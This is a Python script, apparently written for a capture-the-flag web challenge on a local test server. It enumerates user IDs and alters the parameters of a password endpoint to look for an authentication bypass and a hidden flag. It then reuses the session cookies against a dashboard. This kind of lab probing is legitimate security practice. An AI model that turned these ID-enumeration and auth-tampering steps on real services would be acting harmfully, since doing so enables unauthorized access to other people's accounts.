import requests
import re

base_url = "http://127.0.0.1:32933"
session_cookie = "session=eyJ1c2VyX2lkIjoxMDAzMn0.ac0IYA.qF_Br3NgazEdjAfxvNTyRVE9Cko"

headers = {'Cookie': session_cookie, 'User-Agent': 'Mozilla/5.0'}

print("[+] Investigating responses with only user_id parameter...")

# Test a few cases to see what happens when username is missing
for uid in [10030, 10031, 10032, 10033, 10034]:
    data = {'user_id': str(uid), 'password': 'test'}
    resp = requests.post(f"{base_url}/password/test", data=data, headers=headers)
    print(f"\n[+] uid={uid}: Status={resp.status_code}, Size={len(resp.text)}")
    
    if len(resp.text) < 1500:
        print(f"    Response: {resp.text}")
    else:
        # Check if it's a valid form
        if 'form' in resp.text.lower():
            print(f"    Contains form")
        else:
            print(f"    No form found")
    
    # Look for FLAG
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    if flags:
        print(f"    [!] FLAG FOUND: {flags}")
        print(f"    Full response: {resp.text}")

# Try with empty username
print("\n[+] Testing with empty username...")
for uid in [10030, 10031, 10032, 10033, 10034]:
    data = {'username': '', 'user_id': str(uid), 'password': 'test'}
    resp = requests.post(f"{base_url}/password/test", data=data, headers=headers)
    print(f"[+] uid={uid}: Size={len(resp.text)}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    if flags:
        print(f"    [!] FLAG FOUND: {flags}")
        print(f"    Full response: {resp.text}")

# Check response when login is ERROR vs SUCCESS
print("\n[+] Comparing error vs success responses...")
# Password error
data_err = {'username': 'test', 'user_id': '10032', 'password': 'wrongpassword'}
resp_err = requests.post(f"{base_url}/password/test", data=data_err, headers=headers)
print(f"[+] Incorrect password: Size={len(resp_err.text)}")

# Correct password
data_ok = {'username': 'test', 'user_id': '10032', 'password': 'test'}
resp_ok = requests.post(f"{base_url}/password/test", data=data_ok, headers=headers)
print(f"[+] Correct password: Size={len(resp_ok.text)}, URL={resp_ok.url}")

# Check if we're redirected
print(f"    Redirects: {resp_ok.history}")
print(f"    Status codes: {[r.status_code for r in resp_ok.history]}")

# Check cookies from successful login
if resp_ok.history:
    final_resp = resp_ok.history[-1]
    print(f"    Cookies from redirect: {dict(resp_ok.cookies)}")
    
    # Test if we get dashboard access with these cookies
    print("\n[+] Testing /dashboard after successful login...")
    new_resp = requests.get(f"{base_url}/dashboard", cookies=resp_ok.cookies)
    print(f"    Status: {new_resp.status_code}")
    if new_resp.status_code != 500:
        print(f"    Size: {len(new_resp.text)}")
